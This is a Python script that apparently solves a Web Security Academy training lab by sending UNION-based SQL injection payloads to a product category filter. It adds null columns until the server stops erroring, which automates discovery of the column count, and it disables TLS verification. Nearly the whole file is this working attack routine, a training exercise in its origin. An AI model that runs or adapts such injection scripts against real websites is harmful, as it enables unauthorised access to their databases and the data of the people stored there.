import requests
import bs4
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_internal_server_error(text):
    soup=bs4.BeautifulSoup(text,"html.parser")
    error_tag = soup.find('p', attrs={'class': 'is-warning'})
    if error_tag:
        error = error_tag.get_text(strip=True)
    else:
        error = None
    if error=="Internal Server Error":
        return False
    else:
        return True

def main():
    host="https://0a45002c04ae41cb807a2ce500050032.web-security-academy.net"
    client=requests.Session()
    client.verify=False
    product_url=f'{host}/filter?category='
    null_value="null"
    comment="--"
    payload1=product_url+f"'UNION select {null_value}"
    comma=","
    r=client.get(product_url+comment)
    i=False
    while i==False:
        answer=check_internal_server_error(client.get(payload1+comment).text)
        print("executed payload: "+ payload1+comment)
        if answer==False:
            payload1=payload1+comma+null_value
        else:
            i=True
    if check_internal_server_error(client.get(payload1+comment).text):
        print(f'[+] Lab Solved LESSGOOOOO')
    else:
        print(f'Try harder noob!')


if __name__=="__main__":
    main()
